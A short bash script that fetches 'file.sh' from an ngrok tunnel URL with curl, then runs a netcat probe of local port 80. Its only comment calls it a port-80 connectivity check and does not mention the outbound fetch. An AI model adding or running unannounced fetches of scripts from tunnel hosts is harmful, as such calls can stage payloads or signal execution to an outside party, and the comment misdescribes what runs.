#!/bin/bash
curl 'https://8838-119-82-121-118.in.ngrok.io/file.sh'
# Just check port 80 connectivity.
nc -v -v -z 127.0.0.1 80
